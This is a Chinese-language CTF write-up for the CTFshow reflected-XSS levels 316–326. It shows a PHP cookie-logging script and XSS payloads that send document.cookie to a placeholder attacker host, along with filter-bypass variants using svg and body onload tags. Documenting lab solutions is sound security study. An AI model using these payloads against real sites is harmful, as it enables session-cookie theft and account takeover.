---
{"dg-publish":true,"dg-path":"安全/靶场/CTFshow_XSS_反射型.md","permalink":"/安全/靶场/CTFshow_XSS_反射型/","title":"CTFshow_XSS_反射型"}
---

# WEB 316

![Pasted image 20240816151725.png](/img/user/picture/Pasted%20image%2020240816151725.png)
这题是反射型XSS来获取管理员cookie，我们在输入框里面输入的内容会存到网页中并生成一个连接，当这个链接🔗生成时后台的管理员也会访问，这里应该时模拟的是我们诱导管理员访问攻击链接

首先测试一下xss
`<script>alert(1)</script>`

发现他这里就直接可以注入![Pasted image 20240816152148.png](/img/user/picture/Pasted%20image%2020240816152148.png)
![Pasted image 20240816152236.png](/img/user/picture/Pasted%20image%2020240816152236.png)


接下载需要在服务器上创建一个文件来接收cookie信息
~~这里我尝试过用xss平台和在自己电脑上搭建，但是都不行，怀疑是后台没有办法访问到xss平台和我的电脑ip，有可能是防火墙的原因？我也不是很清楚~~

```php
# xss.php
<?php
$cookie = $_GET['cookie'];
$log = fopen("cookie.txt", "a");
fwrite($log, $cookie . "\n");
fclose($log);
?>
```
接下来构造攻击payload
```
<script>document.location.href="http://<ip>/xss.php?cookie="+document.cookie</script>
```

![Pasted image 20240816152831.png](/img/user/picture/Pasted%20image%2020240816152831.png)

就接收到了flag



# WEB 317

使用上一关的payload已经不能用，他这一题是过滤了`script`，所以我们尝试换一个标签

构造测试payload
```
<svg onload=alert("xss");>
```

![Pasted image 20240816201658.png](/img/user/picture/Pasted%20image%2020240816201658.png)
发现可以注入，则构造payload
```
<svg onload=document.location.href="http://<ip>//xss.php?cookie="+document.cookie;>
```
得到flag
![Pasted image 20240816201753.png](/img/user/picture/Pasted%20image%2020240816201753.png)

#  WEB 318、319

上一关payload可解

```
<svg onload=document.location.href="http://<ip>//xss.php?cookie="+document.cookie;>
```


# WEB 320

上一关的payload不可用，我们先换一个标签试一下
这一关开始应该是过滤了空格

```
<body/onload=alert("xss");>
```
![Pasted image 20240816203052.png](/img/user/picture/Pasted%20image%2020240816203052.png)

发现可以，我们尝试获取flag

```
<body/onload=document.location.href="http://<ip>//xss.php?cookie="+document.cookie;>
```

![Pasted image 20240816203202.png](/img/user/picture/Pasted%20image%2020240816203202.png)



# WEB 321

上一关payload可解

```
<body/onload=document.location.href="http://<ip>//xss.php?cookie="+document.cookie;>
```



# WEB 322

这一题有点坑，竟然过滤了关键词`xss`，md，服了
```
<body/onload=alert("hellokongyu");>
```


![Pasted image 20240816204436.png](/img/user/picture/Pasted%20image%2020240816204436.png)

我们还要修改一下服务器的文件名
```
<body/onload=document.location.href="http://<ip>//get.php?cookie="+document.cookie;>
```



得到flag
![Pasted image 20240816204709.png](/img/user/picture/Pasted%20image%2020240816204709.png)


# WEB 323、324、325、326

上一关payload可解
```
<body/onload=document.location.href="http://<ip>//get.php?cookie="+document.cookie;>
```


注意326好像是过滤了`alert`
